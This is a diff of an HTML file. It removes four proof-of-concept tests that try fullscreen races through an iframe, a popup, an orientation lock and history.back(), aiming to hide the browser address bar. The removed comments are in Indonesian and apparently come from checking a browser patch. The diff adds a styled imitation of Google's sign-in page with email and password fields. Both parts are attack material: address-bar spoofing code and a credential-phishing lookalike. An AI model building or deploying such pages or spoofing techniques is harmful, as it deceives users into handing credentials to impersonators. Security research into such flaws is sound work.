@@ -1,62 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
+<head><meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+ body{font-family:Roboto,Arial,sans-serif;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#fff}
+ .logo{font-size:2.2rem;color:#4285F4;font-weight:500;margin-bottom:24px}
+ .box{border:1px solid #dadce0;border-radius:8px;padding:40px;width:320px}
+ input{width:100%;padding:12px;margin:12px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}
+ button{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;float:right}
+</style></head>
 <body>
-<button onclick="A()">Test A: fullscreen via iframe content</button><br>
-<button onclick="B()">Test B: fullscreen + orientation race</button><br>
-<button onclick="C()">Test C: popup fullscreen (satu gesture)</button><br>
-<button onclick="D()">Test D: fullscreen + history.back() race</button>
-
-<script>
-// A: iframe dengan allow fullscreen, request dari gesture di parent
-//    (cek apakah patch hanya enforce di top-level document)
-function A() {
-  const f = document.createElement('iframe');
-  f.allow = 'fullscreen';
-  f.src = 'about:blank';
-  document.body.appendChild(f);
-  f.onload = () => {
-    f.contentDocument.documentElement.requestFullscreen()
-      .then(() => f.contentDocument.body.innerHTML = '<h1>Google Sign in (fake)</h1>')
-      .catch(e => console.log('A blocked:', e.name, e.message));
-  };
-}
-
-// B: fullscreen dari top-level gesture, lalu lock orientation + ganti konten
-//    saat transisi — targetnya omnibox tidak re-layout
-function B() {
-  document.documentElement.requestFullscreen()
-    .then(() => screen.orientation.lock('landscape'))
-    .then(() => {
-      document.body.innerHTML = '<h1>Google Sign in (fake)</h1>';
-    })
-    .catch(e => console.log('B blocked:', e.name, e.message));
-}
-
-// C: window.open DARI gesture yang sama, inject konten + fullscreen di popup
-//    (popup baru di-allow karena dibuka dari gesture)
-function C() {
-  const w = window.open('about:blank');
-  if (!w) return console.log('C: popup blocked');
-  w.document.body.innerHTML = '<h1>Google Sign in (fake)</h1>';
-  w.document.documentElement.requestFullscreen()
-    .then(() => console.log('C: fullscreen ok di popup'))
-    .catch(e => console.log('C blocked:', e.name, e.message));
-}
-
-// D: fullscreen, lalu history.back() saat transisi — omnibox kadang
-//    tidak kembali sinkron dengan konten yang tampil
-function D() {
-  history.pushState({p:1}, '', '?step=2');
-  document.documentElement.requestFullscreen()
-    .then(() => {
-      history.back();
-      setTimeout(() => {
-        document.body.innerHTML = '<h1>Google Sign in (fake)</h1>';
-      }, 50);
-    })
-    .catch(e => console.log('D blocked:', e.name, e.message));
-}
-</script>
+<div class="logo">Google</div>
+<div class="box">
+  <h2 style="font-weight:400">Sign in</h2>
+  <p>with your Google Account</p>
+  <input placeholder="Email or phone">
+  <input type="password" placeholder="Password">
+  <button>Next</button>
+</div>
 </body>
 </html>
